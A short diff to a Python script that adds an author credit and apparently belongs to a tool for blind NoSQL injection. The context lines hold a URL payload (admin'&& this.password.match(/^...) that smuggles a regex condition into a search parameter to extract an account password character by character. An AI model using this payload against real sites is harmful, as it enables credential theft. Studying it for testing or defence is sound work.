@@ -1,3 +1,5 @@
+#By DannyDanHammer
+
 import requests
 #Here we will use && as well as regex to look for altered text with in the page to signify matches. You can alter the parameters to fit you needs.
 url_base = "Begining.example.php.url/?search=admin'%26%26 this.password.match(/^"
